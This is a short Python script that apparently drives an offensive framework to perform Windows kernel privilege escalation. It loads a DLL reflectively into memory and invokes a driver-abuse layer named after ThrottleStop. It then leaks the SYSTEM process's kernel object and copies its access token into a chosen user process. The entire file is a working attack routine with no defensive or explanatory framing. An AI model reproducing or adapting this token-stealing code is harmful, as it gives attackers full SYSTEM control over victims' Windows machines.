import eternalhush as eh
from additional.clingyspider import api, extapi
from additional.clingyspider import const
from additional.clingyspider import __on_ready_callback
from additional import memrwlib
from additional.clingyspider.nt_const import *
import additional.darknarrator as dana
import os
import time

def main(args):
    byte_dll = open("D:\\EternalHushFramework\\build\\modules\\DaNa\\files\\X64_DarkNarratorExt.dll", "rb").read()
    mptr = api.VirtualAlloc(len(byte_dll), const.MEM_COMMIT | const.MEM_RESERVE, const.PAGE_READWRITE)
    l = api.WriteMemory(mptr, byte_dll)
    print(l)
    m = api.MemMapLibraryFromBuffer(mptr, len(byte_dll))
    print(hex(m))
    res = extapi.RegisterUserExtension(m)
    print(res)

    res = extapi.EnumUserExtensions()
    print(res)

    res = extapi.InvokeUserExtensionApi(dana.DANA_SELECT_LAYER, dana.THROTTLESTOP_LAYER)
    print(res)

    system_eprocess = extapi.InvokeUserExtensionApi(dana.DANA_LEAK_KERNEL_OB, 0x4, 4)
    print(hex(system_eprocess))
    #res = extapi.InvokeUserExtensionApi(dana.DANA_READ_VIRT_MEM, 0xffffe189d7c83080+0x4b8, 8)
    #print(res)
    #teb_ptr = memrwlib.NtCurrentTeb()
    #print(hex(teb_ptr))
    #pid = int.from_bytes(api.ReadMemory(teb_ptr+0x40, eh.LONG, asyncio=False), 'little')
    #pid = memrwlib.ReadLlong(teb_ptr + 0x40)
    pid = 9292
    print(pid)
    hproc = api.GetProcessHandle(pid, const.PROCESS_ALL_ACCESS)
    print(hex(hproc))

    user_eprocess = extapi.InvokeUserExtensionApi(dana.DANA_LEAK_KERNEL_OB, hproc, pid)
    print(hex(user_eprocess))

    token = int.from_bytes(extapi.InvokeUserExtensionApi(dana.DANA_READ_VIRT_MEM, system_eprocess+0x4b8, 8), 'little') & 0xfffffffffffffff0
    print(hex(token ))

    print(token.to_bytes(8, 'little'))
    res = extapi.InvokeUserExtensionApi(dana.DANA_WRITE_VIRT_MEM, user_eprocess+0x4b8, token.to_bytes(8, 'little'))
    print(res)

    res = extapi.InvokeUserExtensionApi(dana.DANA_FINALIZE_LAYER)
    print(res)
    res = extapi.UnregisterUserExtension(dana.DARKNARRATOR_UID)
    print(hex(res))

    res = api.MemUnmapLibraryFromBuffer(m)
    print(res)